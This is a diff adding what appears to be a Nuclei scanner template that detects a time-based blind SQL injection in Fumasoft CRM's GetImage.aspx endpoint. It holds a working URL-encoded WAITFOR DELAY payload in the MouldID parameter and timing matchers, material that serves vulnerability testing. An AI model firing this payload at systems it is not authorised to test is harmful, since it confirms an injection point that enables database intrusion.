@@ -1,0 +1,32 @@
+id: fumasoft-GetImage-sqli
+info:
+  name: 孚盟云CRM GetImage.aspx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/blsd9kmrpeaibn5d
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: fumasoft,sqli
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%35%27%2d%2d HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
